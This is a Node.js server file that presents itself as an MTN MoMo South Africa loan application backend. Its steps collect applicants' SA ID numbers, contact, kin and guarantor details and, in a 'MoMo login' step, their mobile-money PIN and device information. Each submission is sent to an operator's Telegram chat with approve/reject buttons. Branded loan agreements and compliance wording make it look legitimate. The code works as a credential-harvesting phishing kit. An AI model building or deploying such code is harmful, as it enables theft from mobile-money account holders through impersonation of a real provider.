// ============================================================
// server.js – MTN MoMo South Africa  (FINAL v6.5)
// + Rate limiting · Helmet · Session cookies · PDF · i18n hooks
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const helmet = require('helmet');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const PDFDocument = require('pdfkit');

const { TNC_VERSION, TNC_EFFECTIVE, TERMS_TEXT } = require('./terms');

const app = express();

// ✅ #3: Trust proxy (needed behind nginx / Cloudflare / Heroku)
app.set('trust proxy', 1);

// ✅ #3: Security headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            // Inline handlers are used throughout index.html — allow unsafe-inline for now
            // (future: refactor to event listeners and drop this)
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));

// ✅ #3: Compression
app.use(compression());

app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
const IS_PROD = process.env.NODE_ENV === 'production';

// ✅ #1: Rate limiters
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,      // 15 min
    max: 300,
    standardHeaders: true,
    legacyHeaders: false,
    message: { ok: false, error: 'Too many requests. Please slow down.' }
});
const registerLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,      // 1 hour
    max: 10,
    message: { ok: false, error: 'Too many registration attempts. Try again later.' }
});
const submitStepLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,      // 1 hour
    max: 60,
    keyGenerator: (req) => req.body?.applicationId || req.ip,
    message: { ok: false, error: 'Too many attempts. Please wait.' }
});
app.use('/api/', globalLimiter);

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting... (v6.5)');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
console.log('═══════════════════════════════════════');

// ─── Account Types ───
const ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true,  description: 'Standard MoMo account' },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true,  description: 'Higher limits account' },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false, description: 'Basic MoMo account (no ID required)' }
};

const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
const LEGACY_STEPS = ['application', 'sms', 'pin', 'otp'];

// ─── Data Store ───
const applications  = {};
const registrations = {};
const DATA_DIR   = path.join(__dirname, '../data');
const DATA_FILE  = path.join(DATA_DIR, 'applications.json');
const REG_FILE   = path.join(DATA_DIR, 'registrations.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function saveApps() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({ applications, timestamp: new Date().toISOString() }, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}
function saveRegs() {
    try {
        fs.writeFileSync(REG_FILE, JSON.stringify({ registrations, timestamp: new Date().toISOString() }, null, 2));
    } catch (e) { console.error('Save regs error:', e.message); }
}
function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
            }
        }
        if (fs.existsSync(REG_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
            Object.assign(registrations, parsed.registrations || {});
            console.log(`📂 Loaded ${Object.keys(registrations).length} registrations`);
        }
    } catch (e) { console.error('Load error:', e.message); }
}

function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); } catch (e) {}
    console.log(JSON.stringify(entry));
}

// ─── Helpers ───
function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function monthlyRepayment(principal, months) {
    if (!principal || !months) return 0;
    return Math.ceil(principal / months);
}

function ensureSteps(app_) {
    if (!app_.steps) app_.steps = {};
    STEP_ORDER.forEach(k => { if (!(k in app_.steps)) app_.steps[k] = 'idle'; });
    return app_.steps;
}
function readStep(app_, step) {
    if (app_.steps && step in app_.steps) return app_.steps[step];
    if (step in app_) return app_[step];
    return 'idle';
}
function writeStep(app_, step, value) {
    if (app_.steps && step in app_.steps) app_.steps[step] = value;
    if (step in app_) app_[step] = value;
    if (step === 'qualification') {
        app_.qualification = (value === 'approved') ? 'qualified'
                            : (value === 'rejected') ? 'unqualified'
                            : value;
    }
}

// ✅ #5: Session helpers
function issueSession(res, applicationId) {
    const token = jwt.sign({ id: applicationId }, SESSION_SECRET, { expiresIn: '7d' });
    res.cookie('momoSession', token, {
        httpOnly: true,
        sameSite: 'lax',
        secure: IS_PROD,           // HTTPS-only in production
        maxAge: 7 * 24 * 60 * 60 * 1000,
        signed: false
    });
}
function readSession(req) {
    try {
        const raw = req.cookies?.momoSession;
        if (!raw) return null;
        return jwt.verify(raw, SESSION_SECRET);
    } catch (e) { return null; }
}
// Middleware: blocks cross-user access when a session cookie exists
function guardAppId(req, res, next) {
    const id = req.params.applicationId;
    const session = readSession(req);
    if (session && session.id !== id) {
        return res.status(403).json({ ok: false, error: 'Session does not match this application.' });
    }
    next();
}

// ─── SA ID Validation ───
function validateSAID(id) {
    if (!id) return { ok: false, reason: 'ID number is required.' };
    const clean = String(id).replace(/\s/g, '');
    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
        return { ok: false, reason: 'Invalid date of birth in ID.' };
    }
    const now = new Date();
    let age = now.getFullYear() - year;
    const m = now.getMonth() - (mm - 1);
    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    let sum = 0, alt = false;
    for (let i = clean.length - 1; i >= 0; i--) {
        let n = parseInt(clean[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';
    return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
}

// ─── Telegram ───
async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (${result.result?.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) {
        console.error('❌ TG error:', e.message);
        return { ok: false };
    }
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}

function buildStepMessage(step, app_, type, data) {
    const header = `🆔 ${code(app_.applicationId)}\n`;
    switch (step) {
        case 'loan': {
            const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
            const required = Math.ceil(data.loanAmount * 0.20);
            const effectiveRequired = Math.min(required, type.monthlyCap);
            return `📋 <b>LOAN REQUEST (STEP 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b> (max R ${fmt(type.maxLoan)})\n\n` +
                `<b>💰 LOAN</b>\nType: ${esc(data.loanType)}\nAmount: <b>R ${fmt(data.loanAmount)}</b>\n` +
                `Term: ${esc(data.loanTerm)}\nMonthly: <b>R ${fmt(monthly)}</b>\nPurpose: ${esc(data.loanPurpose)}\n\n` +
                `<b>📊 QUALIFICATION (20% rule)</b>\nRequired: R ${fmt(required)}\n` +
                `Account cap: R ${fmt(type.monthlyCap)}\nEffective: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
                `✅ <b>Approve loan request?</b>`;
        }
        case 'personal':
            return `👤 <b>PERSONAL DETAILS (STEP 2/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Name: ${esc(data.firstName)} ${esc(data.lastName)}\n` +
                `Phone: ${code('+27' + data.phone)}\nEmail: ${esc(data.email)}\n\n` +
                `✅ <b>Approve personal details?</b>`;
        case 'employment':
            return `💼 <b>EMPLOYMENT &amp; KIN (STEP 3/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Employment: ${esc(data.employment)}\nAnnual Income: R ${fmt(data.annualIncome)}\n` +
                `Next of kin: ${esc(data.kinName)} ${code('+27' + data.kinPhone)}\n\n` +
                `✅ <b>Approve employment?</b>`;
        case 'guarantor':
            return `🤝 <b>GUARANTOR (STEP 4/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Name: ${esc(data.guarantorName)}\nPhone: ${code('+27' + data.guarantorPhone)}\n` +
                `Relationship: ${esc(data.guarantorRelation)}\n\n✅ <b>Approve guarantor?</b>`;
        case 'momologin': {
            const pinStr = (data.loginMethod === 'pin' && data.pin) ? code(data.pin) : '🔒 Biometric';
            return `🔐 <b>MOMO LOGIN (STEP 5/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Phone: ${code('+27' + data.phone)}\nMethod: ${esc(data.loginMethod || 'pin')}\n` +
                `PIN: ${pinStr}\nDevice: ${esc(data.deviceInfo || 'Unknown')}\n\n` +
                `✅ <b>Approve MoMo login?</b>`;
        }
        case 'qualification': {
            const loanAmount = app_.loanAmount || 0;
            const months = parseInt(app_.loanTerm) || 12;
            const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
            const required = Math.ceil(loanAmount * 0.20);
            const effectiveRequired = Math.min(required, type.monthlyCap);
            return `📊 <b>FINAL QUALIFICATION (STEP 6/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `<b>👤 APPLICANT</b>\n${esc(app_.firstName || '')} ${esc(app_.lastName || '')}\n` +
                `${code('+27' + (app_.phone || ''))}\n\n` +
                `<b>💰 LOAN</b>\nAmount: <b>R ${fmt(loanAmount)}</b>\nTerm: ${esc(app_.loanTerm || '')}\n` +
                `Monthly: <b>R ${fmt(monthly)}</b>\n\n` +
                `<b>📊 REQUIREMENT</b>\n20%: R ${fmt(required)}\nCap: R ${fmt(type.monthlyCap)}\n` +
                `Effective: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
                `<b>🤝 GUARANTOR</b>\n${esc(app_.guarantorName || 'N/A')}\n` +
                `${app_.guarantorPhone ? code('+27' + app_.guarantorPhone) : ''}\n\n` +
                `✅ <b>Approve to complete the loan?</b>`;
        }
        default:
            return `Step "${step}" pending for ${code(app_.applicationId)}`;
    }
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', version: '6.5', uptime: process.uptime(), applications: Object.keys(applications).length });
});

app.get('/api/telegram-debug', async (req, res) => {
    const result = {
        tokenSet: !!BOT_TOKEN,
        tokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
        tokenHasColon: BOT_TOKEN ? BOT_TOKEN.includes(':') : false,
        chatIdSet: !!CHAT_ID,
        chatId: CHAT_ID || 'MISSING'
    };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); }
    catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend(`🧪 <b>Test</b>`); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});

app.get('/api/account-types', (req, res) => {
    res.json({ ok: true, types: ACCOUNT_TYPES });
});

// Public Terms endpoint
app.get('/api/terms', (req, res) => {
    res.json({
        ok: true,
        version: TNC_VERSION,
        effective: TNC_EFFECTIVE,
        text: TERMS_TEXT
    });
});

// ═══════════════════════════════════════════════════════════
// REGISTRATION (rate-limited + session cookie)
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', registerLimiter, async (req, res) => {
    try {
        const {
            applicationId, idNumber, accountType,
            phone, email, fullName,
            dob: dobProvided,
            tncAccepted
        } = req.body || {};

        if (!applicationId || !idNumber || !accountType) {
            return res.status(400).json({ ok: false, error: 'Missing required fields.' });
        }
        if (!ACCOUNT_TYPES[accountType]) {
            return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        }
        if (!phone || !/^\d{9}$/.test(String(phone))) {
            return res.status(400).json({ ok: false, error: 'Valid 9-digit mobile number required.' });
        }
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) {
            return res.status(400).json({ ok: false, error: 'Valid email address required.' });
        }
        if (!tncAccepted || tncAccepted !== true) {
            return res.status(400).json({ ok: false, error: 'You must read and accept the Terms & Conditions to continue.' });
        }

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateSAID(idNumber);
            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        }

        const derivedDob = idCheck.ok && idCheck.dob ? idCheck.dob : null;
        if (type.requiresId && dobProvided && derivedDob) {
            const norm = (s) => String(s || '').slice(0, 10);
            if (norm(dobProvided) !== norm(derivedDob)) {
                return res.status(400).json({ ok: false, error: 'Date of birth does not match the SA ID number.' });
            }
        }

        if (!applications[applicationId]) {
            applications[applicationId] = { applicationId, createdAt: new Date().toISOString() };
        }
        ensureSteps(applications[applicationId]);

        applications[applicationId].momoRegistration = {
            idNumber: type.requiresId ? idNumber : null,
            dob: derivedDob || dobProvided || null,
            accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            phone: phone, email: email,
            fullName: fullName || null,
            idDetails: idCheck.ok && type.requiresId ? {
                age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob
            } : null,
            registeredAt: new Date().toISOString()
        };
        applications[applicationId].isRegistered = true;
        applications[applicationId].accountType = accountType;
        applications[applicationId].accountMaxLoan = type.maxLoan;
        applications[applicationId].phone = phone;
        applications[applicationId].email = email;
        applications[applicationId].dob = derivedDob || dobProvided || null;
        applications[applicationId].tncAccepted = {
            accepted: true,
            version: TNC_VERSION,
            effective: TNC_EFFECTIVE,
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
            userAgent: (req.headers['user-agent'] || '').slice(0, 200)
        };
        if (!applications[applicationId].personalData) {
            applications[applicationId].personalData = { firstName: null, lastName: null, phone: phone, email: email };
        }
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApps();

        // ✅ #5: Issue session cookie
        issueSession(res, applicationId);

        console.log(`✅ MoMo registration: ${applicationId} → ${type.name}`);
        audit('registration_main', { applicationId, accountType, phone, email, dob: derivedDob, tnc: TNC_VERSION });

        await tgSend(
            `📱 <b>NEW MOMO REGISTRATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>📞 CONTACT (for verification)</b>\n` +
            `Phone: ${code('+27' + phone)}\n` +
            `Email: ${code(email)}\n` +
            (fullName ? `Name: ${esc(fullName)}\n` : '') +
            `\n🆔 App ID: ${code(applicationId)}\n` +
            `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b>\n${esc(type.description)}\n\n` +
            `<b>📊 LIMITS</b>\nDaily: R ${fmt(type.dailyCash)}\nMonthly: R ${fmt(type.monthlyCap)}\n` +
            `Max Loan: <b>R ${fmt(type.maxLoan)}</b>\n` +
            (idCheck.ok && type.requiresId
                ? `\n<b>🇿🇦 ID DETAILS</b>\nID: ${code(idNumber)}\n<b>DOB: ${code(idCheck.dob)}</b>\n` +
                  `Age: ${idCheck.age} · ${idCheck.gender}\nCitizenship: ${idCheck.citizenship}\n`
                : '') +
            `\n<b>📜 COMPLIANCE</b>\n✅ T&amp;C accepted · v${TNC_VERSION}\n` +
            `🕒 ${new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Johannesburg' })}\n` +
            `\n<b>🔎 VERIFICATION CHECKLIST</b>\n☐ Confirm phone belongs to applicant\n` +
            `☐ Confirm email is reachable\n☐ Confirm DOB matches ID holder\n☐ Confirm ID matches wallet owner\n\n✅ Registration captured`
        );

        res.json({
            ok: true, accountType, accountName: type.name,
            phone, email,
            dob: derivedDob || dobProvided || null,
            tncVersion: TNC_VERSION,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            message: `${type.name} registered successfully.`
        });
    } catch (e) {
        console.error('Registration error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.post('/api/register-momo-telegram', async (req, res) => {
    try {
        const { applicationId, idNumber, accountType, phone, email, fullName, extra } = req.body || {};
        if (!idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing ID or account type.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });

        const type = ACCOUNT_TYPES[accountType];
        const idCheck = type.requiresId ? validateSAID(idNumber) : { ok: true };
        if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });

        const regId = applicationId || ('REG-' + Date.now().toString().slice(-6));
        registrations[regId] = {
            regId, idNumber: type.requiresId ? idNumber : null,
            accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            phone: phone || null, email: email || null,
            fullName: fullName || null, extra: extra || null,
            registeredAt: new Date().toISOString(),
            source: 'register-momo-telegram'
        };
        saveRegs();
        audit('registration_temp_endpoint', { regId, accountType, phone, email });

        await tgSend(
            `📱 <b>NEW MOMO REGISTRATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 Reg ID: ${code(regId)}\n` +
            (phone ? `📞 ${code('+27' + phone)}\n` : '') +
            (email ? `📧 ${code(email)}\n` : '') +
            `\n${type.icon} <b>${type.name}</b>\nMax loan: <b>R ${fmt(type.maxLoan)}</b>\n\n✅ Registration captured`
        );

        res.json({
            ok: true, regId, accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            message: `${type.name} registered. Your maximum loan is R ${fmt(type.maxLoan)}.`
        });
    } catch (e) {
        console.error('Temp reg error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// UNIFIED STEP SUBMISSION (rate-limited + guarded)
// ═══════════════════════════════════════════════════════════
app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
    try {
        const { applicationId, step, data } = req.body || {};
        if (!applicationId || !step) {
            return res.status(400).json({ ok: false, error: 'Missing applicationId or step.' });
        }
        if (!STEP_ORDER.includes(step)) {
            return res.status(400).json({ ok: false, error: `Invalid step: ${step}` });
        }

        // ✅ #5: Session guard
        const session = readSession(req);
        if (session && session.id !== applicationId) {
            return res.status(403).json({ ok: false, error: 'Session does not match this application.' });
        }

        const app_ = applications[applicationId];
        if (!app_) {
            return res.status(404).json({ ok: false, code: 'NOT_REGISTERED', error: 'Application not found. Please register first.' });
        }
        if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'You must register on MoMo before applying.' });
        }

        const type = ACCOUNT_TYPES[app_.accountType];
        ensureSteps(app_);

        const idx = STEP_ORDER.indexOf(step);
        if (idx > 0) {
            const prev = STEP_ORDER[idx - 1];
            if (app_.steps[prev] !== 'approved') {
                return res.status(400).json({ ok: false, error: `Previous step "${prev}" is not approved yet.` });
            }
        }

        if (step === 'loan') {
            const { loanType, loanAmount, loanTerm, loanPurpose } = data || {};
            if (!loanType || !loanAmount || !loanTerm || !loanPurpose) {
                return res.status(400).json({ ok: false, error: 'Complete all loan fields.' });
            }
            if (loanAmount < type.minLoan) {
                return res.status(400).json({ ok: false, error: `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.` });
            }
            if (loanAmount > type.maxLoan) {
                return res.status(400).json({ ok: false, error: `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}.` });
            }
            app_.loanType = loanType;
            app_.loanAmount = loanAmount;
            app_.loanTerm = loanTerm;
            app_.loanPurpose = loanPurpose;
            app_.monthlyRepayment = monthlyRepayment(loanAmount, parseInt(loanTerm));
            app_.loanData = { loanType, loanAmount, loanTerm, loanPurpose };
        }

        if (step === 'personal') {
            const { firstName, lastName, phone, email } = data || {};
            if (!firstName || !lastName || !phone || !email) {
                return res.status(400).json({ ok: false, error: 'Complete all personal fields.' });
            }
            app_.firstName = firstName;
            app_.lastName = lastName;
            app_.phone = phone;
            app_.email = email;
            app_.personalData = { firstName, lastName, phone, email };
        }

        if (step === 'employment') {
            const { employment, annualIncome, kinName, kinPhone } = data || {};
            if (!employment || annualIncome == null || !kinName || !kinPhone) {
                return res.status(400).json({ ok: false, error: 'Complete all employment fields.' });
            }
            app_.employment = employment;
            app_.annualIncome = annualIncome;
            app_.kinName = kinName;
            app_.kinPhone = kinPhone;
            app_.employmentData = { employment, annualIncome, kinName, kinPhone };
        }

        if (step === 'guarantor') {
            const { guarantorName, guarantorPhone, guarantorRelation } = data || {};
            if (!guarantorName || !guarantorPhone || !guarantorRelation) {
                return res.status(400).json({ ok: false, error: 'Complete all guarantor fields.' });
            }
            if (app_.phone && guarantorPhone === app_.phone) {
                return res.status(400).json({ ok: false, error: 'Guarantor phone cannot be your own.' });
            }
            app_.guarantorName = guarantorName;
            app_.guarantorPhone = guarantorPhone;
            app_.guarantorRelation = guarantorRelation;
            app_.guarantorData = { guarantorName, guarantorPhone, guarantorRelation };
        }

        if (step === 'momologin') {
            const { phone, pin, loginMethod, deviceInfo } = data || {};
            if (!phone) return res.status(400).json({ ok: false, error: 'Phone required.' });
            if (app_.phone && phone !== app_.phone) {
                return res.status(400).json({ ok: false, error: 'Phone number must match your registered personal phone.' });
            }
            if (loginMethod === 'pin' && (!pin || !/^\d{5}$/.test(pin))) {
                return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
            }
            app_.loginPhone = phone;
            app_.loginPin = (loginMethod === 'pin') ? pin : null;
            app_.loginMethod = loginMethod || 'pin';
            app_.deviceInfo = deviceInfo || null;
            app_.momoLoginData = { phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo };
        }

        if (step === 'qualification') {
            const required = Math.ceil((app_.loanAmount || 0) * 0.20);
            app_.qualificationRequired = Math.min(required, type.monthlyCap);
        }

        app_.steps[step] = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        console.log(`📝 Step submitted: ${applicationId} → ${step}`);
        audit('step_submitted', { id: applicationId, step, accountType: app_.accountType });

        askApproval(buildStepMessage(step, app_, type, data || {}), step, applicationId);
        res.json({ ok: true, status: 'pending', step });
    } catch (e) {
        console.error('submit-step:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// AGREEMENT (JSON) & PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;
    const tnc = app_.tncAccepted || {};

    const agreement = `MTN MOMO SOUTH AFRICA – LOAN AGREEMENT
================================================

Application ID : ${app_.applicationId}
Generated      : ${new Date().toLocaleString('en-ZA')}
T&C Version    : ${tnc.version || TNC_VERSION}

BORROWER
--------
Full Name      : ${app_.firstName || ''} ${app_.lastName || ''}
ID Number      : ${app_.momoRegistration?.idNumber || 'N/A'}
Date of Birth  : ${app_.dob || app_.momoRegistration?.dob || 'N/A'}
Age            : ${app_.momoRegistration?.idDetails?.age || 'N/A'}
Gender         : ${app_.momoRegistration?.idDetails?.gender || 'N/A'}
Citizenship    : ${app_.momoRegistration?.idDetails?.citizenship || 'N/A'}
Phone          : +27 ${app_.phone || ''}
Email          : ${app_.email || ''}
MoMo Account   : ${app_.momoRegistration?.accountName || app_.accountType || 'N/A'}

LOAN DETAILS
------------
Principal      : R ${fmt(loanAmount)}
Term           : ${loanTerm}
Monthly Payment: R ${fmt(monthly)}
Total Repayment: R ${fmt(total)}
Interest Rate  : 27% per annum (compounded monthly, NCA compliant)

GUARANTOR
---------
Name           : ${app_.guarantorName || 'N/A'}
Phone          : ${app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : 'N/A'}
Relationship   : ${app_.guarantorRelation || 'N/A'}

DATA PROCESSING (POPIA)
-----------------------
The Borrower consents to the collection and processing of personal
information for the purposes of loan assessment, disbursement, and
recovery, as set out in the Terms & Conditions v${tnc.version || TNC_VERSION}.

TERMS & CONDITIONS ACCEPTANCE
-----------------------------
Accepted on  : ${tnc.timestamp ? new Date(tnc.timestamp).toLocaleString('en-ZA') : 'N/A'}
Version      : ${tnc.version || 'N/A'}
IP Address   : ${tnc.ip || 'N/A'}

TERMS SUMMARY
-------------
1. Borrower agrees to repay the loan per the agreed schedule.
2. Guarantor accepts joint and several liability on default.
3. Late payments attract penalties per the National Credit Act.
4. Early settlement is permitted without penalty.
5. MoMo transaction history informs ongoing eligibility.
6. 5-business-day cooling-off period applies.

SIGNATURE
---------
By accepting the Terms & Conditions at registration, the Borrower
and Guarantor acknowledged and agreed to be bound by this agreement.

Accepted electronically · MTN MoMo South Africa
© 2026 MTN MoMo South Africa`;

    res.json({ ok: true, agreement });
});

// ✅ #7: PDF agreement download
app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Months';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;
    const tnc = app_.tncAccepted || {};

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="momo-agreement-${app_.applicationId}.pdf"`);
    doc.pipe(res);

    // Header
    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold')
        .text('MTN MoMo South Africa', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666')
        .text('Loan Agreement', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);

    const line = (label, value) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(label + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (value || 'N/A'));
    };

    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('BORROWER');
    doc.moveDown(0.3);
    line('Application ID', app_.applicationId);
